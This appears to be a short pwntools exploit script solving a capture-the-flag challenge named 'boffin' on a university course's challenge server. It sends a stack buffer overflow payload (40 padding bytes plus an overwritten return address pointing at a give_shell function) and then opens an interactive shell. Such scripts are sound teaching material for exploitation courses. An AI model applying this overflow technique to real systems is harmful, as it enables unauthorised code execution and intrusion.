from pwn import *
#e = ELF("./boffin")
#shell = e.symbols["give_shell")
#p = process("./boffin")
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1337)
p.recv()
p.sendline('jd3846')
#gdb.attach(p)
p.sendline('A' * 40 + p64(0x40069d))
print "Enjoy your shell!"
p.interactive()
